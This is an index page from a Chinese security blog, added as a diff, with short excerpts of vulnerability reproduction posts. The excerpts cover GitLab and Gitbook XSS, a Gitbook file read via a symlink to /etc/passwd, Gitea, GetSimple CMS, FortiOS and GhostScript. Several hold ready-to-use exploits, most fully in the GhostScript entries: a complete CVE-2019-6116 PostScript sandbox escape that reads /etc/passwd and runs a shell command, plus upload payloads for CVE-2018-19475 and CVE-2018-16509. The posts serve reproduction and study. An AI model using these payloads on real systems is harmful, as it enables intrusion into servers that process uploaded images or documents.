@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/73/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-Gitlab/Gitlab wiki 储存型xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Gitlab/Gitlab%20wiki%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" class="article-date">
+  <time datetime="2022-07-08T06:25:56.994Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Gitlab-wiki-储存型xss"><a href="#Gitlab-wiki-储存型xss" class="headerlink" title="Gitlab wiki 储存型xss"></a>Gitlab wiki 储存型xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><ul>
+<li><p>  1、登录到GitLab。</p>
+</li>
+<li><p>  2、打开有权编辑Wiki页面的’Project’。</p>
+</li>
+<li><p>  3、打开Wiki页面。</p>
+</li>
+<li><p>  4、点击’New page’。</p>
+</li>
+<li><p>  5、用’javascript:’填写’Page slug’表单。</p>
+</li>
+<li><p>  6、点击’Createpage’。</p>
+</li>
+<li><p>  7、填写每个表格：</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>Title: javascript:
+
+Format:Markdown
+
+Content: [XSS](.alert(1);)
+</code></pre>
+<p><img src="/resource/Gitlabwiki%E5%82%A8%E5%AD%98%E5%9E%8Bxss/media/rId24.png"></p>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Gitlab/Gitlab%20wiki%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Gitlab/Gitlab%20wiki%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" data-id="cl5c2qplx0086y8v1368k2ufn" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Gitea/Gitea 1.4.0 目录穿越导致命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Gitea/Gitea%201.4.0%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:56.989Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Gitea-1-4-0-目录穿越导致命令执行漏洞"><a href="#Gitea-1-4-0-目录穿越导致命令执行漏洞" class="headerlink" title="Gitea 1.4.0 目录穿越导致命令执行漏洞"></a>Gitea 1.4.0 目录穿越导致命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Gitea 1.4.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>执行如下命令启动启动漏洞环境：</p>
+<pre><code>docker-compose up -d
+</code></pre>
+<p>环境启动后，访问<code>http://www.0-sec.org:3000</code>，将进入安装页面，填写管理员账号密码，并修改网站URL，其他的用默认配置安装即可。（不要修改端口号）</p>
+<p>安装完成后，创建一个公开的仓库，随便添加点文件进去（比如使用选定的文件和模板初始化仓库）：1.png</p>
+<p>然后，需要执行一次docker-compose restart重启gitea服务。</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Gitea/Gitea%201.4.0%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Gitea/Gitea%201.4.0%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qphh0080y8v17tgg5jz8" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Gitbook/（CVE-2019-19596）Gitbook 储存型xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Gitbook/%EF%BC%88CVE-2019-19596%EF%BC%89Gitbook%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" class="article-date">
+  <time datetime="2022-07-08T06:25:56.947Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-19596）Gitbook-储存型xss"><a href="#（CVE-2019-19596）Gitbook-储存型xss" class="headerlink" title="（CVE-2019-19596）Gitbook 储存型xss"></a>（CVE-2019-19596）Gitbook 储存型xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>GitBook through 2.6.9 allows XSS via a local .md file</p>
+<p>By entering script in MD file, it can be executed by gitbook</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>GitBook 2.6.9</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><img src="/resource/(CVE-2019-19596)Gitbook%E5%82%A8%E5%AD%98%E5%9E%8Bxss/media/rId24.png"></p>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Gitbook/%EF%BC%88CVE-2019-19596%EF%BC%89Gitbook%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Gitbook/%EF%BC%88CVE-2019-19596%EF%BC%89Gitbook%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/" data-id="cl5c2qpmd008by8v1a10h7eni" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Gitbook/（CVE-2017-15688）Gitbook 任意文件读取" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Gitbook/%EF%BC%88CVE-2017-15688%EF%BC%89Gitbook%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="article-date">
+  <time datetime="2022-07-08T06:25:56.945Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2017-15688）Gitbook-任意文件读取"><a href="#（CVE-2017-15688）Gitbook-任意文件读取" class="headerlink" title="（CVE-2017-15688）Gitbook 任意文件读取"></a>（CVE-2017-15688）Gitbook 任意文件读取</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>创建一个md文件，代码用以下</p>
+<pre><code>ln -s /etc/passwd ./passwd.md
+</code></pre>
+<p><img src="/resource/(CVE-2017-15688)Gitbook%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/media/rId24.png"></p>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Gitbook/%EF%BC%88CVE-2017-15688%EF%BC%89Gitbook%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Gitbook/%EF%BC%88CVE-2017-15688%EF%BC%89Gitbook%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" data-id="cl5c2qpmc008ay8v1by9pb8r9" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-GhostScript/（CVE-2019-6116）GhostScript 沙箱绕过（命令执行）漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/GhostScript/%EF%BC%88CVE-2019-6116%EF%BC%89GhostScript%20%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:56.909Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-6116）GhostScript-沙箱绕过（命令执行）漏洞"><a href="#（CVE-2019-6116）GhostScript-沙箱绕过（命令执行）漏洞" class="headerlink" title="（CVE-2019-6116）GhostScript 沙箱绕过（命令执行）漏洞"></a>（CVE-2019-6116）GhostScript 沙箱绕过（命令执行）漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Ghostscript<br>9.26版本中存在输入验证错误漏洞。该漏洞源于网络系统或产品未对输入的数据进行正确的验证。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Ghostscript 9.26版本</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><strong>poc.png</strong></p>
+<pre><code>%!PS
+% extract .actual_pdfpaintproc operator from pdfdict
+/.actual_pdfpaintproc pdfdict /.actual_pdfpaintproc get def
+
+/exploit &#123;
+    (Stage 11: Exploitation...)=
+
+    /forceput exch def
+
+    systemdict /SAFER false forceput
+    userparams /LockFilePermissions false forceput
+    systemdict /userparams get /PermitFileControl [(*)] forceput
+    systemdict /userparams get /PermitFileWriting [(*)] forceput
+    systemdict /userparams get /PermitFileReading [(*)] forceput
+
+    % update
+    save restore
+
+    % All done.
+    stop
+&#125; def
+
+errordict /typecheck &#123;
+    /typecount typecount 1 add def
+    (Stage 10: /typecheck #)=only typecount ==
+
+    % The first error will be the .knownget, which we handle and setup the
+    % stack. The second error will be the ifelse (missing boolean), and then we
+    % dump the operands.
+    typecount 1 eq &#123; null &#125; if
+    typecount 2 eq &#123; pop 7 get exploit &#125; if
+    typecount 3 eq &#123; (unexpected)= quit &#125;  if
+&#125; put
+
+% The pseudo-operator .actual_pdfpaintproc from pdf_draw.ps pushes some
+% executable arrays onto the operand stack that contain .forceput, but are not
+% marked as executeonly or pseudo-operators.
+%
+% The routine was attempting to pass them to ifelse, but we can cause that to
+% fail because when the routine was declared, it used `bind` but many of the
+% names it uses are not operators and so are just looked up in the dictstack.
+%
+% This means we can push a dict onto the dictstack and control how the routine
+% works.
+&lt;&lt;
+    /typecount      0
+    /PDFfile        &#123; (Stage 0: PDFfile)= currentfile &#125;
+    /q              &#123; (Stage 1: q)= &#125; % no-op
+    /oget           &#123; (Stage 3: oget)= pop pop 0 &#125; % clear stack
+    /pdfemptycount  &#123; (Stage 4: pdfemptycount)= &#125; % no-op
+    /gput           &#123; (Stage 5: gput)= &#125;  % no-op
+    /resolvestream  &#123; (Stage 6: resolvestream)= &#125; % no-op
+    /pdfopdict      &#123; (Stage 7: pdfopdict)= &#125; % no-op
+    /.pdfruncontext &#123; (Stage 8: .pdfruncontext)= 0 1 mark &#125; % satisfy counttomark and index
+    /pdfdict        &#123; (Stage 9: pdfdict)=
+        % cause a /typecheck error we handle above
+        true
+    &#125;
+&gt;&gt; begin &lt;&lt;&gt;&gt; &lt;&lt;&gt;&gt; &#123; .actual_pdfpaintproc &#125; stopped pop
+
+(Should now have complete control over ghostscript, attempting to read /etc/passwd...)=
+
+% Demonstrate reading a file we shouldnt have access to.
+(/etc/passwd) (r) file dup 64 string readline pop == closefile
+
+(Attempting to execute a shell command...)= flush
+
+% run command
+(%pipe%id &gt; /tmp/success) (w) file closefile
+
+(All done.)=
+
+quit
+</code></pre>
+<p>上传这个poc文件，即可执行<code>id &gt; /tmp/success</code>：</p>
+<p><img src="/resource/(CVE-2019-6116)GhostScript%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87(%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C)%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/GhostScript/%EF%BC%88CVE-2019-6116%EF%BC%89GhostScript%20%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/GhostScript/%EF%BC%88CVE-2019-6116%EF%BC%89GhostScript%20%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qphj0083y8v1gwoydmrt" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-GhostScript/（CVE-2018-19475）GhostScript 沙箱绕过（命令执行）漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/GhostScript/%EF%BC%88CVE-2018-19475%EF%BC%89GhostScript%20%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:56.907Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2018-19475）GhostScript-沙箱绕过（命令执行）漏洞"><a href="#（CVE-2018-19475）GhostScript-沙箱绕过（命令执行）漏洞" class="headerlink" title="（CVE-2018-19475）GhostScript 沙箱绕过（命令执行）漏洞"></a>（CVE-2018-19475）GhostScript 沙箱绕过（命令执行）漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>./psi/zdevice2.c文件存在安全特征问题漏洞。该漏洞是源于网络系统或产品中缺少身份验证、访问控制、权限管理等安全措施。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Ghostscript 9.26之前版本</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>将POC作为图片上传，执行命令<code>id &gt; /tmp/success &amp;&amp; cat /tmp/success</code>：</p>
+<pre><code>POST /index.php HTTP/1.1
+Host: target
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryukZmnyhO
+Content-Length: 279
+
+------WebKitFormBoundaryukZmnyhO
+Content-Disposition: form-data; name=&quot;file_upload&quot;; filename=&quot;1.jpg&quot;
+content-Type=&quot;image/png&quot;
+
+%!PS
+0 1 300367 &#123;&#125; for
+&#123;save restore&#125; stopped &#123;&#125; if
+(%pipe%id &gt; /tmp/success &amp;&amp; cat /tmp/success) (w) file
+------WebKitFormBoundaryukZmnyhO--
+</code></pre>
+<p>命令已成功执行：</p>
+<p><img src="/resource/(CVE-2018-19475)GhostScript%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87(%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C)%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/GhostScript/%EF%BC%88CVE-2018-19475%EF%BC%89GhostScript%20%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/GhostScript/%EF%BC%88CVE-2018-19475%EF%BC%89GhostScript%20%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qphi0081y8v14g1rh542" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-GhostScript/（CVE-2018-16509）GhostScript 沙箱绕过（命令执行）漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/GhostScript/%EF%BC%88CVE-2018-16509%EF%BC%89GhostScript%20%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:56.905Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2018-16509）GhostScript-沙箱绕过（命令执行）漏洞"><a href="#（CVE-2018-16509）GhostScript-沙箱绕过（命令执行）漏洞" class="headerlink" title="（CVE-2018-16509）GhostScript 沙箱绕过（命令执行）漏洞"></a>（CVE-2018-16509）GhostScript 沙箱绕过（命令执行）漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>该漏洞源于在处理/invalidaccess异常时，程序没有正确的检测’restoration of<br>privilege（权限恢复）’。攻击者可通过提交特制的PostScript利用该漏洞执行代码。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Ghostscript 9.24之前版本</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>上传poc.png，将执行命令<code>id &gt; /tmp/success &amp;&amp; cat /tmp/success</code>。此时进入容器<code>docker-compose exec web bash</code>，将可以看到/tmp/success已被创建：</p>
+<p><strong>poc.png</strong></p>
+<pre><code>%!PS
+userdict /setpagedevice undef
+save
+legal
+&#123; null restore &#125; stopped &#123; pop &#125; if
+&#123; legal &#125; stopped &#123; pop &#125; if
+restore
+mark /OutputFile (%pipe%id &gt; /tmp/success &amp;&amp; cat /tmp/success) currentdevice putdeviceprops
+</code></pre>
+<p><img src="/resource/(CVE-2018-16509)GhostScript%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87(%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C)%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/GhostScript/%EF%BC%88CVE-2018-16509%EF%BC%89GhostScript%20%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/GhostScript/%EF%BC%88CVE-2018-16509%EF%BC%89GhostScript%20%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qphi0082y8v11w3idjtf" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-GetSimple CMS/（CVE-2019-11231）GetSimple CMS远程命令执行" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/GetSimple%20CMS/%EF%BC%88CVE-2019-11231%EF%BC%89GetSimple%20CMS%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-date">
+  <time datetime="2022-07-08T06:25:56.821Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-11231）GetSimple-CMS-远程命令执行"><a href="#（CVE-2019-11231）GetSimple-CMS-远程命令执行" class="headerlink" title="（CVE-2019-11231）GetSimple CMS 远程命令执行"></a>（CVE-2019-11231）GetSimple CMS 远程命令执行</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>在GetSimple<br>3.3.15版本中，攻击者可以通过伪造管理员cookie，绕过身份验证登陆后台，进而通过后台编辑模板功能模块写入php代码，造成远程代码执行漏洞。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>GetSimple&lt;=3.3.15</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在分析该漏洞前，不得不提.htaccess文件，本次漏洞的产生，是因为默认情况下apache对.htaccess配置文件的开启情况不同而产生的。</p>
+<p>htaccess文件是Apache服务器中的配置文件，它负责相关目录下的网页配置。通过配置htaccess文件，可以实现众多功能，例如：允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等。</p>
+<p>启用.htaccess，需要在apache配置文件中，启用AllowOverride。</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/GetSimple%20CMS/%EF%BC%88CVE-2019-11231%EF%BC%89GetSimple%20CMS%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/GetSimple%20CMS/%EF%BC%88CVE-2019-11231%EF%BC%89GetSimple%20CMS%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="cl5c2qpd4007zy8v12f58guzs" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Fortinet FortiOS/（CVE-2018-13383）Fortinet FortiOS 缓冲区错误漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Fortinet%20FortiOS/%EF%BC%88CVE-2018-13383%EF%BC%89Fortinet%20FortiOS%20%E7%BC%93%E5%86%B2%E5%8C%BA%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:56.787Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2018-13383）Fortinet-FortiOS-缓冲区错误漏洞"><a href="#（CVE-2018-13383）Fortinet-FortiOS-缓冲区错误漏洞" class="headerlink" title="（CVE-2018-13383）Fortinet FortiOS 缓冲区错误漏洞"></a>（CVE-2018-13383）Fortinet FortiOS 缓冲区错误漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Fortinet<br>FortiOS是美国飞塔（Fortinet）公司的一套专用于FortiGate网络安全平台上的安全操作系统。该系统为用户提供防火墙、防病毒、IPSec/SSLVPN、Web内容过滤和反垃圾邮件等多种安全功能。<br>Fortinet FortiOS<br>6.2.0之前版本中存在堆缓冲区溢出漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Fortinet Fortios 6.2 Fortinet Fortios 6.0.5</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>这是WebVPN功能的漏洞。在解析HTML中的JavaScript时，它会尝试使用以下代码将内容复制到缓冲区中：</p>
+<pre><code>memcpy(buffer, js_buf, js_buf_len);
+</code></pre>
+<p>缓冲区大小固定为<code>0x2000</code>，但输入字符串是无限制的。因此，这里存在堆溢出。值得注意的是，此漏洞可以溢出Null字节，这在我们的利用中很有用。为触发此溢出，我们需要将exploit放到HTTP服务器上，然后以普通用户权限登录SSL<br>VPN代理访问我们的exploit为普通用户。</p>
+<blockquote>
+<p>这里我们用PHP编写的PoC放在HTTP服务器上:</p>
+<p>//请自行修改里面的ip以及所需要的执行的命令</p>
+</blockquote>
+        
+          <p class="article-more-link">
